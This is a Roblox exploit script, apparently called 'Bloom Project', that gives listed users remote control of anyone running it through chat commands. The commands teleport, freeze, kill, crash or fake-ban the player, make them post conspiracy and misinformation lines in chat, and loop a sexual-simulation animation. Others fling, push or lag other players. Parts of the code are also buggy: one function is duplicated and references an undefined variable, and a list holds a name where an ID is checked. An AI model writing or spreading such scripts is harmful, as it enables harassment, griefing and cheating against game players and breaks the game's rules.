local players = game:GetService("Players")
local plr = players.LocalPlayer
local OnBenx = false
local OnBunny = false
local prefix = "/"
local Flinging = false
local PushTool = nil

--Tier 1 List
local BrokenVip = {}
local BrokenPremium = {}
local BrokenPuppeter = {}
local BrokenStaff = {"itzvampxx",}

-- ASSETS

local milk = {
	12480466786;
}

local jumpscares = {
    10755920324,
    1119705746,
    12213285275,
    12293699441,
    10727260846,
    12342625873,
    8804558033;
}
local memes = {
    8373881910,
    7279156932,
    11648246803,
    928967808,
    9260491536,
    551973081,
    8863809025,
    11569839895;
}

local dumbthings = {
	"If there's inflation, they should just print more bills",
	"Banks just want to keep our money; it's better to keep everything at home.",
	"Gravity doesn't exist; the Earth is just accelerating upward and pressing us down.",
	"Airplanes fly in straight lines because the Earth is flat. If it were curved, they'd have to follow a curve",
	"Natural immunity is more effective than immunity provided by vaccines.",
	"The Illuminati secretly control the world and manipulate global events.",
	"5G causes COVID and other serious illnesses.",
	"The cure for cancer already exists but is kept secret to keep pharmaceutical companies rich.",
}

--FUNCTIONS
local function GetRoot(player)
	return player.Character.HumanoidRootPart
end

local function GetLT(player)
	return player.Character.LowerTorso
end

local function GetHum(player)
	return player.Character.Humanoid
end

local function GetPing()
	return (game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())/1000
end

local function GetPush()
	local TempPush = nil
	pcall(function()
		if plr.Backpack:FindFirstChild("Push") then
			PushTool = plr.Backpack.Push
			PushTool.Parent = plr.Character
			TempPush = PushTool
		end
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Character:FindFirstChild("Push") then
				TempPush = v.Character.Push
			end
		end
	end)
	return TempPush
end

local function GetPlayer(UserDisplay)
	if UserDisplay ~= "" then
        for i,v in pairs(game.Players:GetPlayers()) do
            if v.Name:lower():match(UserDisplay) or v.DisplayName:lower():match(UserDisplay) then
                return v
            end
        end
		return nil
	else
		return nil
    end
end

local function PredictionTP(player,method)
	local root = GetRoot(player)
	local pos = root.Position
	local vel = root.Velocity
	GetRoot(plr).CFrame = CFrame.new((pos.X)+(vel.X)*(GetPing()*3.5),(pos.Y)+(vel.Y)*(GetPing()*2),(pos.Z)+(vel.Z)*(GetPing()*3.5))
	if method == "safe" then
		task.wait()
		GetRoot(plr).CFrame = CFrame.new(pos)
		task.wait()
		GetRoot(plr).CFrame = CFrame.new((pos.X)+(vel.X)*(GetPing()*3.5),(pos.Y)+(vel.Y)*(GetPing()*2),(pos.Z)+(vel.Z)*(GetPing()*3.5))
	end
end

local function Push(Target)
	local Push = GetPush()
	local FixTool = nil
	if Push ~= nil then
		local args = {[1] = Target.Character}
		GetPush().PushTool:FireServer(unpack(args))
	end
	if plr.Character:FindFirstChild("Push") then
		plr.Character.Push.Parent = plr.Backpack
	end
	if plr.Character:FindFirstChild("ModdedPush") then
		FixTool = plr.Character:FindFirstChild("ModdedPush")
		FixTool.Parent = plr.Backpack
		FixTool.Parent = plr.Character
	end
	if plr.Character:FindFirstChild("ClickTarget") then
		FixTool = plr.Character:FindFirstChild("ClickTarget")
		FixTool.Parent = plr.Backpack
		FixTool.Parent = plr.Character
	end
	if plr.Character:FindFirstChild("potion") then
		FixTool = plr.Character:FindFirstChild("potion")
		FixTool.Parent = plr.Backpack
		FixTool.Parent = plr.Character
	end
end

local function ToggleFling(bool)
	task.spawn(function()
		if bool then
			local RVelocity = nil
			Flinging = true
			repeat
				pcall(function()
					RVelocity = GetRoot(plr).Velocity 
					GetRoot(plr).Velocity = Vector3.new(math.random(-150,150),9000,math.random(-150,150))
					game.RunService.RenderStepped:wait()
					GetRoot(plr).Velocity = RVelocity
				end)
				game.RunService.Heartbeat:wait()
			until Flinging == false
		else
			Flinging = false
		end
	end)
end

local function GetPush()
	local TempPush = nil
	pcall(function()
		if plr.Backpack:FindFirstChild("Push") then
			PushTool = plr.Backpack.Push
			PushTool.Parent = plr.Character
			TempPush = PushTool
		end
		for i,v in pairs(Players:GetPlayers()) do
			if v.Character:FindFirstChild("Push") then
				TempPush = v.Character.Push
			end
		end
	end)
	return TempPush
end

local function Arg3(command)
	local x = ""
	for i,v in pairs(command) do
		pcall(function ()
			if i>=2 then
				x = x.." "..command[i+1]
			end
		end)
	end
	return x
end

local function CheckCMD(arg,command)
	if string.find(arg,prefix..""..command) then
		return true
	else
		return false
	end
end

local function GenImage(list)
	task.spawn(function()
		local ScreenGui = Instance.new("ScreenGui")
		local Image = Instance.new("ImageLabel")
		ScreenGui.Name = "Temp"
		ScreenGui.IgnoreGuiInset = true
		ScreenGui.Parent = game.CoreGui
		Image.Name = "Image"
		Image.ImageTransparency = 0
		Image.BackgroundTransparency = 1
		Image.Position = UDim2.new(0,0,0,0)
		Image.Size = UDim2.new(1,0,1,0)
		Image.Image = "rbxassetid://"..list[math.random(1,#list)]
		Image.Parent = ScreenGui
		task.wait(5)
		ScreenGui:Destroy()
	end)
end

local function ToggleRagdoll(bool)
	pcall(function()
		plr.Character:FindFirstChild("Falling down").Disabled = bool
        plr.Character:FindFirstChild("Swimming").Disabled = bool
        plr.Character:FindFirstChild("StartRagdoll").Disabled = bool
        plr.Character:FindFirstChild("Pushed").Disabled = bool
        plr.Character:FindFirstChild("KillScript").Disabled = bool
        plr.Character:FindFirstChild("RagdollMe").Disabled = bool
	end)
end

local function BenxTP(player,offset)
	GetRoot(plr).CFrame = GetLT(player).CFrame*CFrame.new(0,0,offset)*CFrame.Angles(-1.5,math.rad(0),0); task.wait()
	GetRoot(plr).Velocity = Vector3.new(0,0,0)						
end

--[[TIER 1 TEMPLATE

			if CheckCMD(Split[1],"cmd") then
				if (not ClientIsVip) or (SpeakerIsPremium) then
					--SCRIPT
				end
			end

	TIER 2 TEMPLATE

			if CheckCMD(Split[1],"cmd") then
				if SpeakerIsPremium then
					--SCRIPT
				end
			end
]]
local function ExecuteCommand(Pid,msg)
	local Speaker = players:GetPlayerByUserId(Pid)
	local LowerCMD = msg:lower()
	local Split = string.split(LowerCMD," ")
	local LowerName, LowerDisplay = string.lower(plr.Name), string.lower(plr.DisplayName)
	local ClientIsVip = table.find(BrokenVip,plr.UserId)
	local ClientIsPremium = table.find(BrokenPremium,plr.UserId)
	local SpeakerIsPremium = table.find(BrokenPremium,Speaker.UserId)
	local SpeakerIsPuppeteer = table.find(BrokenPuppeter,Speaker.UserId)
	local SpeakerIsOwner = table.find(BrokenStaff,Speaker.UserId)
	pcall(function()
		local Allowed = string.find(LowerDisplay,Split[2]) or string.find(LowerName,Split[2])
		if Allowed then
			--TIER 1
			if CheckCMD(Split[1],"bring") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					GetRoot(plr).CFrame = GetRoot(Speaker).CFrame
				end
			end
			if CheckCMD(Split[1],"bunny") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					OnBunny = true
					repeat task.wait()
						pcall(function()
							if GetHum(plr).FloorMaterial ~= Enum.Material.Air then
								GetHum(plr):ChangeState(3)
							end
						end)
					until OnBunny == false
				end
			end
			if CheckCMD(Split[1],"check") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					local args = {[1] = ("/w "..Speaker.Name.." I'm using Bloom Project."),[2] = "All"}
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
					local args = {[1] = ("/leave"),[2] = "To "..Speaker.Name}
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
					task.wait(GetPing()+0.1)
					for i,dm in pairs(plr.PlayerGui.Chat.Frame.ChatChannelParentFrame["Frame_MessageLogDisplay"].Scroller:GetChildren()) do
						if dm:IsA("Frame") and dm:FindFirstChildOfClass("TextLabel") then
							if string.find(dm:FindFirstChildOfClass("TextLabel").Text,"System") or string.find(dm:FindFirstChildOfClass("TextLabel").Text,"channel") then
								dm.Visible = false
							end
						end
					end
					
					for i,bubble in pairs(game.CoreGui.BubbleChat:GetDescendants()) do
						if bubble:IsA("TextLabel") then
							if string.find(bubble.Text,"System") then
								bubble.Parent.Parent.Visible = false
							end
						end
					end
				end
			end
			if CheckCMD(Split[1],"dumb") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					local args = {[1] = dumbthings[math.random(1, #dumbthings)],[2] = "All"}
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
				end
			end
			if CheckCMD(Split[1],"fling") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					GetRoot(plr).CFrame = CFrame.new(9999999999,9999999999,9999999999)
				end
			end
			if CheckCMD(Split[1],"freeze") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					for i,v in pairs(plr.Character:GetChildren()) do
						if v:IsA("BasePart") then
							v.Anchored = true
						end
					end
				end
			end
			if CheckCMD(Split[1],"glitch") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					local GlitchPart = Instance.new("Part")
					GlitchPart.Name = "XD"
					GlitchPart.Transparency = 1
					GlitchPart.Size = Vector3.new(5,5,5)
					GlitchPart.CanCollide = false
					GlitchPart.Anchored = false
					GlitchPart.Parent = GetRoot(plr)
					local weld = Instance.new("Weld")
					weld.Parent = GlitchPart
					weld.Part0 = GetRoot(plr)
					weld.Part1 = GlitchPart
					GlitchPart.Position = GetRoot(plr).Position+Vector3.new(25,3,-18)
				end
			end
			if CheckCMD(Split[1],"gravity") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					game.Workspace.Gravity = 196
				end
			end
			if CheckCMD(Split[1],"jumpscare") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					GenImage(jumpscares)
				end
			end
			if CheckCMD(Split[1],"jump") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					GetHum(plr):ChangeState(3)
				end
			end
			if CheckCMD(Split[1],"meme") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					GenImage(memes)
				end
			end
			if CheckCMD(Split[1],"milk") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					GenImage(milk)
				end
			end
			if CheckCMD(Split[1],"nogravity") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					game.Workspace.Gravity = 1
				end
			end
			if CheckCMD(Split[1],"ragdoll") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					ToggleRagdoll(false)
					GetHum(plr):ChangeState(0)
				end
			end
			if CheckCMD(Split[1],"say") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					Message = Arg3(Split)
					local args = {[1] = Message,[2] = "All"}
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
				end
			end
			if CheckCMD(Split[1],"sit") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					GetHum(plr).Sit = true
				end
			end
			if CheckCMD(Split[1],"slow") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					GetHum(plr).WalkSpeed = 5
				end
			end
			if CheckCMD(Split[1],"spin") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					local bav = Instance.new("BodyAngularVelocity")
					bav.Parent = GetRoot(plr)
					bav.Name = "Spin"
					bav.MaxTorque = Vector3.new(0,math.huge,0)
					bav.AngularVelocity = Vector3.new(0,30,0)
				end
			end
			if CheckCMD(Split[1],"unfreeze") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					for i,v in pairs(plr.Character:GetChildren()) do
						if v:IsA("BasePart") then
							v.Anchored = false
						end
					end
				end
			end
			if CheckCMD(Split[1],"unbunny") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					OnBunny = false
				end
			end
			if CheckCMD(Split[1],"unslow") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					GetHum(plr).WalkSpeed = 16
				end
			end
			if CheckCMD(Split[1],"unspin") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					if GetRoot(plr):FindFirstChild("Spin") then
						GetRoot(plr).Spin:Destroy()
					end
				end
			end
			if CheckCMD(Split[1],"yeet") then
				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
					for i = 1,500 do
						GetRoot(plr).CFrame = GetRoot(plr).CFrame*CFrame.new(0,5,0)
						GetRoot(plr).Velocity = Vector3.new(0,10,0)
						task.wait()
					end
				end
			end
			--TIER 2
			if CheckCMD(Split[1],"benx") then
				if (not ClientIsPremium) or (SpeakerIsOwner) then
					OnBenx = true
					ToggleRagdoll(true)
					repeat
						task.wait()
						pcall(function()
							GetHum(plr).Sit = true
							BenxTP(Speaker,-1.2); BenxTP(Speaker,-1.4); BenxTP(Speaker,-1.6); BenxTP(Speaker,-1.8); BenxTP(Speaker,-2.0)
							BenxTP(Speaker,-2.2); BenxTP(Speaker,-2.4); BenxTP(Speaker,-2.6); BenxTP(Speaker,-2.8); BenxTP(Speaker,-3,0);
							BenxTP(Speaker,-2.8); BenxTP(Speaker,-2.6); BenxTP(Speaker,-2.4); BenxTP(Speaker,-2.2); BenxTP(Speaker,-2.0);
							BenxTP(Speaker,-1.8); BenxTP(Speaker,-1.6); BenxTP(Speaker,-1.4)
						end)
					until OnBenx == false
				end
			end
			if CheckCMD(Split[1],"blind") then
				if (not ClientIsPremium) or (SpeakerIsOwner) then
					if game:GetService("Lighting"):FindFirstChild("Blur") then
						game:GetService("Lighting"):FindFirstChild("Blur"):Destroy()
					end
					local Blur = Instance.new("BlurEffect")
					Blur.Size = 30
					Blur.Enabled = true
					Blur.Parent = game:GetService("Lighting")
				end
			end
			if CheckCMD(Split[1],"bug") then
				if (not ClientIsPremium) or (SpeakerIsOwner) then
					plr.Character:Destroy()
					plr:Destroy()
				end
			end
			if CheckCMD(Split[1],"crash") then
				if (not ClientIsPremium) or (SpeakerIsOwner) then
					pcall(function()
						while true do end
					end)
				end
			end
			if CheckCMD(Split[1],"explode") then
				if (not ClientIsPremium) or (SpeakerIsOwner) then
					ToggleRagdoll(false)
					GetHum(plr):ChangeState(0)
					task.wait()
					local bav = Instance.new("BodyAngularVelocity")
					bav.Parent = GetRoot(plr)
					bav.Name = "Spin"
					bav.MaxTorque = Vector3.new(0,math.huge,0)
					bav.AngularVelocity = Vector3.new(0,150,0)
				end
			end
			if CheckCMD(Split[1],"fakeban") then
				if (not ClientIsPremium) or (SpeakerIsOwner) then
					pcall(function()
						plr:Kick("You were permanently banned for using exploits.")
					end)
					task.wait(0.1)
					while true do end
				end
			end
			if CheckCMD(Split[1],"kick") then
				if (not ClientIsPremium) or (SpeakerIsOwner) then
					KickMessage = Arg3(Split)
					plr:Kick("Kicked by"..Speaker.Name..". Reason: "..KickMessage)
				end
			end
			if CheckCMD(Split[1],"kill") then
				if (not ClientIsPremium) or (SpeakerIsOwner) then
					GetHum(plr):ChangeState(15)
				end
			end
			if CheckCMD(Split[1],"lag") then
				if (not ClientIsPremium) or (SpeakerIsOwner) then
					task.spawn(function()
						local function SpawnBall()
							local part = Instance.new("Part")
							part.Shape = Enum.PartType.Ball
							part.Name = "XD"
							part.Size = Vector3.new(1,1,1)
							part.Position = Vector3.new(-61, 300, -228)
							part.Transparency = 0.5
							part.CanCollide = true
							part.Anchored = false
							part.Parent = game.Workspace
						end
						while task.wait(0.15) do
							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
						end
					end)
				end
			end
			if CheckCMD(Split[1],"rejoin") then
				if (not ClientIsPremium) or (SpeakerIsOwner) then
					game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
				end
			end
			if CheckCMD(Split[1],"shield") then
				if SpeakerIsPremium then
					_G.shield(Speaker.UserId)
				end
			end
			if CheckCMD(Split[1],"unbenx") then
				if (not ClientIsPremium) or (SpeakerIsOwner) then
					OnBenx = false
				end
			end
			if CheckCMD(Split[1],"unblind") then
				if (not SpeakerIsPremium) or (SpeakerIsOwner) then
					if game:GetService("Lighting"):FindFirstChild("Blur") then
						game:GetService("Lighting"):FindFirstChild("Blur"):Destroy()
					end
				end
			end
			if CheckCMD(Split[1],"virus") then
				if (not SpeakerIsPremium) or (SpeakerIsOwner) then
					repeat task.wait(math.random(1,3))
						GetHum(plr).Health -= math.random(1,5)
					until GetHum(plr).Health <= 0
				end
			end
			--Puppeteer Tier
			local TargetPlayer = GetPlayer(Split[3])
			if CheckCMD(Split[1],"pgoto") then
				if ((not ClientIsVip and not ClientIsPremium) and (SpeakerIsPuppeteer)) or (SpeakerIsOwner) then
					GetRoot(plr).CFrame = GetRoot(TargetPlayer).CFrame
				end
			end
			if CheckCMD(Split[1],"pfling") then
				if ((not ClientIsVip and not ClientIsPremium) and (SpeakerIsPuppeteer)) or (SpeakerIsOwner) then
					local attempts = 0
					local pos = GetRoot(plr).CFrame
					ToggleFling(true)
					repeat task.wait()
						pcall(function()
							attempts += 1
							PredictionTP(TargetPlayer,"safe")
						end)
					until attempts >= 30 or Flinging == false
					GetRoot(plr).CFrame = pos
					ToggleFling(false)
				end
			end
			if CheckCMD(Split[1],"ppush") then
				if ((not ClientIsVip and not ClientIsPremium) and (SpeakerIsPuppeteer)) or (SpeakerIsOwner) then
					local pos = GetRoot(plr).CFrame
					PredictionTP(TargetPlayer)
					task.wait(GetPing()+0.1)
					Push(TargetPlayer)
					GetRoot(plr).CFrame = pos
				end
			end
		end
	end)
end


--Get premiums
for i,v in pairs(players:GetPlayers()) do
	if table.find(BrokenVip,v.UserId) then
		v.Chatted:Connect(function(command)
			ExecuteCommand(v.UserId,command)
		end)
	end
end
players.PlayerAdded:Connect(function(v)
	if table.find(BrokenVip,v.UserId) then
		v.Chatted:Connect(function(command)
			ExecuteCommand(v.UserId,command)
		end)
	end
end)
